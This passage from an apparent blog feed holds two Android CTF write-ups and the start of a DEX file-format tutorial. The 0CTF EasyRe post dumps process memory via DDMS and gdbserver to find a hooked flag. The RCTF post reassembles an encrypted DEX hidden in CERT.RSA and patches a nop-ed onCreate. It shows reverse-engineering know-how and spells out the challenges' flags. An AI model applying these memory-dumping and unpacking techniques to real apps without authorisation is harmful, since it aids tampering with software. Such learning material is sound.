      <content type="html"><![CDATA[<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul><li>hook 系统函数</li><li>dump 内存搜索 flag</li></ul><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/EasyRe.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/EasyRe.apk</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-110325.png" alt=""><br>用jadx反编译apk，在java层的逻辑很简单。<br>读取flag.txt这个文件的内容，然后和我们的输入数据相对比，如果一致就提示“That’s the flag!”<br>找一下这个文件，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-110615.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-110630.png" alt=""><br><code>0ctf{Too_Simple_Sometimes_Naive!!!}</code><br>不出意外是个假flag。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-111700.png" alt=""><br><strong>提示一下，请不要用模拟器打开去输入flag，那你会输出That’s the flag!</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-111805.png" alt=""><br>究其原因是因为模拟器都是用的x86去模拟arm，而这里动的手脚是在so文件里，所以请用真机测试。</p><h3 id="so层分析"><a href="#so层分析" class="headerlink" title="so层分析"></a>so层分析</h3><p>我们推测应该是在apk运行前做了什么操作，找到so文件用IDA打开<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-111935.png" alt="">so文件里没有JNI_Onload函数，找到.init_array段，调用了my_init函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-112136.png" alt=""></p><p>打开后F5反编译，发现CheckSig和j_hook函数，推测做了签名验证反调试和对系统函数进行hook。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-112537.png" alt=""><br>并且根据传入的参数判断应该是hook的read函数。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><a href="http://www.purpleroc.com/MD/2015-03-31@0CTF_WriteUp.html" target="_blank" rel="noopener">http://www.purpleroc.com/MD/2015-03-31@0CTF_WriteUp.html</a><br><a href="http://ipushino.blogspot.de/2015/04/0ops-ctf-qualifiers-2015-simpleapk.html" target="_blank" rel="noopener">http://ipushino.blogspot.de/2015/04/0ops-ctf-qualifiers-2015-simpleapk.html</a><br>github上面给出的两篇wp都没有分析代码，而是在内存中搜索字符串。<br>我翻了翻代码看不太懂，就先学习一下这种姿势。</p><h2 id="dump-内存搜索-flag"><a href="#dump-内存搜索-flag" class="headerlink" title="dump 内存搜索 flag"></a>dump 内存搜索 flag</h2><p>利用 ddms 的 dump HPROF file 功能 (带箭头的油桶图标)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-121436.png" alt=""><br>然后搜索字符串：<br><code>strings easyre.sjl.gossip.easyre.hprof | grep 0ctf</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-121533.png" alt=""><br>flag得到：0ctf{It’s_More_Than_Meets_The_Eye!}<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-121945.png" alt=""></p><h2 id="利用-gore"><a href="#利用-gore" class="headerlink" title="利用 gore"></a>利用 gore</h2><h3 id="gdb下载"><a href="#gdb下载" class="headerlink" title="gdb下载"></a>gdb下载</h3><p>Android NDK 在 r11 之后去掉了 toolchain 中的 gdb 工具，所以我下载了r10 的.(整包下载，只有gdbserver和gdb会报bug)，就像下图这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-125248.png" alt=""></p><h3 id="将gdbserver放入手机并添加执行权限"><a href="#将gdbserver放入手机并添加执行权限" class="headerlink" title="将gdbserver放入手机并添加执行权限"></a>将gdbserver放入手机并添加执行权限</h3><p><code>adb push gdbserver /data/local/tmp</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-123351.png" alt=""></p><h3 id="查找要dump的应用的pid"><a href="#查找要dump的应用的pid" class="headerlink" title="查找要dump的应用的pid"></a>查找要dump的应用的pid</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-123425.png" alt=""><br><code>ps | grep 名字</code></p><h3 id="启动gdbserver，指定监听端口"><a href="#启动gdbserver，指定监听端口" class="headerlink" title="启动gdbserver，指定监听端口"></a>启动gdbserver，指定监听端口</h3><p><code>./gdbserver :1234 --attach pid</code><br>1234可随意指定<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-123847.png" alt=""></p><h3 id="转发端口并调试"><a href="#转发端口并调试" class="headerlink" title="转发端口并调试"></a>转发端口并调试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line">./arm-linux-androideabi-gdb</span><br><span class="line">(gdb) target remote :1234</span><br><span class="line">(gdb) gcore</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-130054.png" alt=""></p><h3 id="gore-dump-出内存后-搜索字符串"><a href="#gore-dump-出内存后-搜索字符串" class="headerlink" title="gore dump 出内存后,搜索字符串"></a>gore dump 出内存后,搜索字符串</h3><p><code>strings core.xxx | grep xxx</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-130657.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>dump出内存的第一种方法比第二种要快速高效一些。<br>另外，在我测试的时候，在不进行任何输入的时候，搜索字符串是搜索不到真正的flag的。<br>click前：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-133139.png" alt=""><br>click后（随便输个123456）：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-133248.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-131427.png" alt=""><br>这也验证了确实是hook了read函数，把从flag.txt读取的字符串进行了某种变换，得到0ctf{It’s_More_Than_Meets_The_Eye!}在内存中。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dump </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2015XCTF&amp;RCTF-where writeup</title>
      <link href="/2018/02/10/dex2/"/>
      <url>/2018/02/10/dex2/</url>
      <content type="html"><![CDATA[<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul><li>dex文件头修复</li><li>onCreate修复</li></ul><h2 id="前置参考"><a href="#前置参考" class="headerlink" title="前置参考"></a>前置参考</h2><p><a href="http://eternalsakura13.com/2018/02/10/dex/">http://eternalsakura13.com/2018/02/10/dex/</a></p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/misc.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/misc.apk</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>直接反编译apk，然后得到算法：输入用户名和密码，长度要想等，用户名和密码的逆序串相等则输出字符串,返回flag。<br>这当然是不可能的，这题可是道misc!<br>实际上，检查apk解压文件发现，下图的abc大小刚好为112字节也就是70h，是一个dex头的大小。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-102018.png" alt=""><br>用010editor打开后发现确实是dex头。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-102059.png" alt=""><br>而CERT.RSA这个不正常的大，其实就是因为把dex主体藏在这了。<br>用010editor打开观察<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-102330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-102729.png" alt=""><br>关键信息就是KEY和aes-128-cbc这个加密方式，KEY后面有一个DEX=…<br>我们知道dex头后面紧接着就是字符串索引项，应该是很整齐的四字节四字节，现在明显是被加密过了。<br>首先把DEX=…后面的数据拷贝出来，保存成文件。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-102944.png" alt=""><br>再把数据直接复制粘贴在新建的文件里就行了。<br>用openssl或者其他工具解密这个文件。<br><code>openssl aes-128-cbc -d -k &quot;Misc@inf0#fjhx11&quot; -nosalt -in encfile -out decfile</code><br>-in encfile是被加密的文件，-out decfile是解密后的文件。<br>打开解密后的文件，现在就很整齐了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-103234.png" alt=""><br>再把文件头拷贝到前面，就拼接出了一个dex文件，嗯，就叫flag好了。</p><h3 id="修复dex"><a href="#修复dex" class="headerlink" title="修复dex"></a>修复dex</h3><p>用010 editor打开拼接好的flag文件，执行dex解析脚本，报错。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fobcm7wpmvj30xm0bytce.jpg" alt=""><br>检查后发现是因为索引区各索引分区的size(其实就是索引项的项数）为0，需要填补。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fobcni6b4rj31340sa7g8.jpg" alt=""></p><p>关于怎么计算，了解dex文件格式的应该很easy，我举个例子。<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fobgknwblbj312i0li0zm.jpg" alt=""><br><code>type_id_off</code>为A8h,<code>string_ids_off</code>偏移为70h，因为每个项的大小为4字节，所以(A8-70)/4=E</p><p>string_ids size = (0x000091DC - 0x00000070) / 4  = 0x0000245B<br>type_ids size   = (0x0000A3EC - 0x000091DC) / 4  = 0x00000484<br>proto_ids size  = (0x0000EF28 - 0x0000A3EC) / 12 = 0x00000645<br>field_ids size  = (0x00015DB8 - 0x0000EF28) / 8  = 0x00000DD2<br>method_ids size = (0x00026DC8 - 0x00015DB8) / 8  = 0x00002202</p><p>这样就算完，填入进行修补。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fobgqepacfj30ny0fs0x4.jpg" alt=""><br>重新解析一下，我们的dex文件就修复好了。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fobgrylh8mj31961fa4q8.jpg" alt=""></p><h3 id="修复onCreate"><a href="#修复onCreate" class="headerlink" title="修复onCreate"></a>修复onCreate</h3><p>用jadx反编译拼接好的dex文件，发现onCreate()方法反编译失败，用IDA打开后发现全被nop掉了（抽空）<br>可以想到运行时动态恢复指令，但是这里没有so，明显不是（这真是道misc……）<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fobgwnp7gaj31gs13yak5.jpg" alt=""><br>所以藏在哪里呢？实际上被抽空的onCreate指令就在下图的y中。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fobh0wskgbj30q20e20w1.jpg" alt=""><br>用IDA打开搜索onCreate，找到nop的起始地址，CODE:00097390<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-095349.png" alt=""><br>用010editor找到对应空白<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-095751.png" alt=""><br>将y的数据拷贝进去，刚好完全填补<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-095902.png" alt=""><br>再次用jadx反编译修复好的dex。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>修复好的onCreate<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String seed = <span class="string">"m3ll0t_yetFLag"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) C0095R.layout.activity_main);</span><br><span class="line">        StringBuilder strb = <span class="keyword">new</span> StringBuilder(<span class="keyword">this</span>.seed);</span><br><span class="line">        strb.replace(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"h"</span>);</span><br><span class="line">        strb.replace(<span class="number">5</span>, <span class="number">6</span>, <span class="string">"2"</span>);</span><br><span class="line">        strb.replace(<span class="number">10</span>, <span class="number">11</span>, <span class="string">"f"</span>);</span><br><span class="line">        strb.replace(<span class="number">7</span>, <span class="number">8</span>, <span class="string">"G"</span>);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"flag is "</span> + strb.toString(), <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(C0095R.menu.main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == C0095R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> StringBuilder <span class="title">replace</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> end, String str)</span></span></span><br></pre></td></tr></table></figure><ul><li>start − This is the beginning index, inclusive.</li><li>end − This is the ending index, exclusive.</li><li>str − This is the String that will replace previous contents.</li></ul><p>查阅文档，然后手动换了一下，得到flag是h3ll02_GetfLag</p><h2 id="我修复好的dex文件链接"><a href="#我修复好的dex文件链接" class="headerlink" title="我修复好的dex文件链接"></a>我修复好的dex文件链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/flag.dex" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/flag.dex</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dex文件格式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dex文件格式学习</title>
      <link href="/2018/02/10/dex/"/>
      <url>/2018/02/10/dex/</url>
      <content type="html"><![CDATA[<h2 id="快速简记："><a href="#快速简记：" class="headerlink" title="快速简记："></a>快速简记：</h2><table><thead><tr><th>结构</th><th style="text-align:right">单位结构体占字节</th><th style="text-align:center">共计字节</th></tr></thead><tbody><tr><td>DexHeader</td><td style="text-align:right">-</td><td style="text-align:center">0x70h</td></tr><tr><td>String Table</td><td style="text-align:right">4</td><td style="text-align:center">-</td></tr><tr><td>Type Table</td><td style="text-align:right">4</td><td style="text-align:center">-</td></tr><tr><td>Proto Table</td><td style="text-align:right">12</td><td style="text-align:center">-</td></tr><tr><td>Field Table</td><td style="text-align:right">8</td><td style="text-align:center">-</td></tr><tr><td>Method Table</td><td style="text-align:right">8</td><td style="text-align:center">-</td></tr><tr><td>Class Def Table</td><td style="text-align:right">32</td><td style="text-align:center">-</td></tr><tr><td>Data Section(含Map Section)</td><td style="text-align:right">-</td><td style="text-align:center">-</td></tr></tbody></table><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fob6z70k4mj30yq0rsh0w.jpg" alt=""></p><h2 id="练习用的dex文件链接"><a href="#练习用的dex文件链接" class="headerlink" title="练习用的dex文件链接"></a>练习用的dex文件链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/Hello.dex" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/Hello.dex</a></p><h2 id="文件布局"><a href="#文件布局" class="headerlink" title="文件布局"></a>文件布局</h2><p>dex 文件可以分为3个模块，头文件(header)、索引区(xxxx_ids)、数据区(data)。<br>头文件概况的描述了整个 dex 文件的分布，包括每一个索引区的大小跟偏移。索引区的ids 是 identifiers 的缩写，表示每个数据的标识，索引区主要是指向数据区的偏移。<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fob912et4zj30m80mq76i.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fob93y9wvcj31co0fedkx.jpg" alt=""><br>010Editor 中除了数据区(data)没有显示出来，其他区段都有显示，另外 <code>link_data</code> 在模板中被定为<code>map_list</code></p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p>header 描述了 dex 文件信息，和其他各个区的索引。010Editor中用结构体 struct header_item 来描述 header。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    dex_magic magic &lt;comment=<span class="string">"Magic value"</span>&gt;; </span><br><span class="line">    uint checksum &lt;format=hex, comment=<span class="string">"Alder32 checksum of rest of file"</span>&gt;;</span><br><span class="line">    SHA1 signature &lt;comment=<span class="string">"SHA-1 signature of rest of file"</span>&gt;;</span><br><span class="line">    uint file_size &lt;comment=<span class="string">"File size in bytes"</span>&gt;;</span><br><span class="line">    uint header_size &lt;comment=<span class="string">"Header size in bytes"</span>&gt;;</span><br><span class="line">    uint endian_tag &lt;format=hex, comment=<span class="string">"Endianness tag"</span>&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(endian_tag != ENDIAN_CONSTANT) &#123;</span><br><span class="line">        <span class="comment">// XXX we don't handle big endian files</span></span><br><span class="line">        Warning(<span class="string">"Invalid endian_tag %.8X, should be %.8X"</span>, endian_tag, ENDIAN_CONSTANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint link_size &lt;comment=<span class="string">"Size of link section"</span>&gt;;</span><br><span class="line">    uint link_off &lt;comment=<span class="string">"File offset of link section"</span>&gt;;</span><br><span class="line">    uint map_off &lt;comment=<span class="string">"File offset of map list"</span>&gt;;</span><br><span class="line">    uint string_ids_size &lt;comment=<span class="string">"Count of strings in the string ID list"</span>&gt;;</span><br><span class="line">    uint string_ids_off &lt;comment=<span class="string">"File offset of string ID list"</span>&gt;;</span><br><span class="line">    uint type_ids_size &lt;comment=<span class="string">"Count of types in the type ID list"</span>&gt;;</span><br><span class="line">    uint type_ids_off &lt;comment=<span class="string">"File offset of type ID list"</span>&gt;;</span><br><span class="line">    uint proto_ids_size &lt;comment=<span class="string">"Count of items in the method prototype ID list"</span>&gt;;</span><br><span class="line">    uint proto_ids_off &lt;comment=<span class="string">"File offset of method prototype ID list"</span>&gt;;</span><br><span class="line">    uint field_ids_size &lt;comment=<span class="string">"Count of items in the field ID list"</span>&gt;;</span><br><span class="line">    uint field_ids_off &lt;comment=<span class="string">"File offset of field ID list"</span>&gt;; </span><br><span class="line">    uint method_ids_size &lt;comment=<span class="string">"Count of items in the method ID list"</span>&gt;;</span><br><span class="line">    uint method_ids_off &lt;comment=<span class="string">"File offset of method ID list"</span>&gt;;</span><br><span class="line">    uint class_defs_size &lt;comment=<span class="string">"Count of items in the class definitions list"</span>&gt;;</span><br><span class="line">    uint class_defs_off &lt;comment=<span class="string">"File offset of class definitions list"</span>&gt;;</span><br><span class="line">    uint data_size &lt;comment=<span class="string">"Size of data section in bytes"</span>&gt;;</span><br><span class="line">    uint data_off &lt;comment=<span class="string">"File offset of data section"</span>&gt;;    </span><br><span class="line">&#125; header_item;</span><br></pre></td></tr></table></figure></p><h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// utility for reading/checking the magic value</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> dex[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> newline;</span><br><span class="line">    <span class="keyword">char</span> ver[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> zero;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// XXX not checking the version, but it should be 035</span></span><br><span class="line">    <span class="keyword">if</span>((Strcmp(dex, <span class="string">"dex"</span>) &amp;&amp; Strcmp(dex, <span class="string">"dey"</span>)) ||</span><br><span class="line">        newline != <span class="string">'\n'</span> ||</span><br><span class="line">        zero != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        Warning(<span class="string">"Invalid DEX file"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; dex_magic &lt;read=DexMagicRead&gt;;</span><br></pre></td></tr></table></figure><p>‘\n’ 10(十进制) 换行（newline）<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fob9ghjr85j31420zqdu4.jpg" alt=""></p><h3 id="checksum"><a href="#checksum" class="headerlink" title="checksum:"></a>checksum:</h3><p>文件校验码，使用 alder32 算法校验文件除去 maigc、checksum 外余下的所有文件区域，用于检查文件错误。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fob9kpcoarj311c0b0n10.jpg" alt=""><br>uint类型，大小为4个字节。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>使用 SHA-1 算法 hash 除去 magic、checksum 和 signature 外余下的所有文件区域， 用于唯一识别本文件,大小为20字节。<br><figure class="highlight plain"><figcaption><span>utility type to show the SHA1 hash in the value column</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef ubyte SHA1[20] &lt;read=SHA1Read, format=hex&gt;;</span><br></pre></td></tr></table></figure></p><h3 id="file-size"><a href="#file-size" class="headerlink" title="file_size"></a>file_size</h3><p>dex 文件大小，4个字节。</p><h3 id="header-size"><a href="#header-size" class="headerlink" title="header_size"></a>header_size</h3><p>header 区域的大小，目前是固定为 0x70<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fob9piyvjoj310a0dgn1g.jpg" alt=""></p><h3 id="endian-tag"><a href="#endian-tag" class="headerlink" title="endian_tag"></a>endian_tag</h3><p>大小端标签，dex 文件格式为小端，固定值为 0x12345678 常量</p><h3 id="link-size"><a href="#link-size" class="headerlink" title="link_size"></a>link_size</h3><p>link section的大小</p><h3 id="link-off"><a href="#link-off" class="headerlink" title="link_off"></a>link_off</h3><p>link section在文件中的偏移</p><h3 id="map-off"><a href="#map-off" class="headerlink" title="map_off"></a>map_off</h3><p><code>map_item</code> 的偏移地址，该 item 属于 data 区里的内容，值要大于等于 <code>data_off</code> 的大小，处于 dex 文件的末端。</p><h3 id="string-ids-size和string-ids-off"><a href="#string-ids-size和string-ids-off" class="headerlink" title="string_ids_size和string_ids_off"></a><code>string_ids_size</code>和<code>string_ids_off</code></h3><p>这两个字段表示dex中用到的所有的字符串内容的大小和偏移值，我们需要解析完这部分，然后用一个字符串池存起来，后面有其他的数据结构会用索引值来访问字符串，这个池子也是非常重要的。后面会详细介绍string_ids的数据结构</p><h3 id="type-ids-size和type-ids-off"><a href="#type-ids-size和type-ids-off" class="headerlink" title="type_ids_size和type_ids_off"></a><code>type_ids_size</code>和<code>type_ids_off</code></h3><p>这两个字段表示dex中的类型数据结构的大小和偏移值，比如类类型，基本类型等信息，后面会详细介绍type_ids的数据结构</p><h3 id="proto-ids-size和type-ids-off"><a href="#proto-ids-size和type-ids-off" class="headerlink" title="proto_ids_size和type_ids_off"></a><code>proto_ids_size</code>和<code>type_ids_off</code></h3><p>这两个字段表示dex中的元数据信息数据结构的大小和偏移值，描述方法的元数据信息，比如方法的返回类型，参数类型等信息，后面会详细介绍proto_ids的数据结构</p><h3 id="field-ids-size和field-ids-off"><a href="#field-ids-size和field-ids-off" class="headerlink" title="field_ids_size和field_ids_off"></a><code>field_ids_size</code>和<code>field_ids_off</code></h3><p>这两个字段表示dex中的字段信息数据结构的大小和偏移值，后面会详细介绍field_ids的数据结构</p><h3 id="method-ids-size和method-ids-off"><a href="#method-ids-size和method-ids-off" class="headerlink" title="method_ids_size和method_ids_off"></a><code>method_ids_size</code>和<code>method_ids_off</code></h3><p>这两个字段表示dex中的方法信息数据结构的大小和偏移值，后面会详细介绍method_ids的数据结构</p><h3 id="class-defs-size和class-defs-off"><a href="#class-defs-size和class-defs-off" class="headerlink" title="class_defs_size和class_defs_off"></a><code>class_defs_size</code>和<code>class_defs_off</code></h3><p>这两个字段表示dex中的类信息数据结构的大小和偏移值，这个数据结构是整个dex中最复杂的数据结构.</p><h3 id="data-size和data-off"><a href="#data-size和data-off" class="headerlink" title="data_size和data_off`"></a><code>data_size和</code>data_off`</h3><p>这两个字段表示dex中数据区域的结构信息的大小和偏移值，这个结构中存放的是数据区域，比如我们定义的常量值等信息。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1foba16m16aj30w40h0gq8.jpg" alt=""><br>上述这些其实就是对应在下图中圈起来的部分的每部分的开头和大小。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1foba2csy42j30hi0ehabr.jpg" alt=""></p><h2 id="string-ids"><a href="#string-ids" class="headerlink" title="string_ids"></a>string_ids</h2><p><code>string_ids</code> 区段描述了 dex 文件中所有的字符串。格式很简单只有一个偏移量，偏移量指向了 <code>string_data</code> 区段的一个字符串：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// strings</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uleb128 utf16_size &lt;comment=<span class="string">"Size of string in UTF-16 code units"</span>&gt;;</span><br><span class="line">    <span class="built_in">string</span> data &lt;comment=<span class="string">"A string in MUTF-8 format"</span>&gt;;</span><br><span class="line">&#125; string_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint string_data_off &lt;comment=<span class="string">"File offset of string data"</span>&gt;;</span><br><span class="line">    string_item string_data &lt;comment=<span class="string">"String item"</span>&gt;;</span><br><span class="line">&#125; string_id_item &lt;read=StringDataReader, optimize=<span class="literal">false</span>&gt;;</span><br></pre></td></tr></table></figure></p><p>一个<code>string_id_item</code>里有两个数据结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint string_data_off </span><br><span class="line">string_item string_data &lt;comment=&quot;String item&quot;&gt;;</span><br></pre></td></tr></table></figure></p><p><img 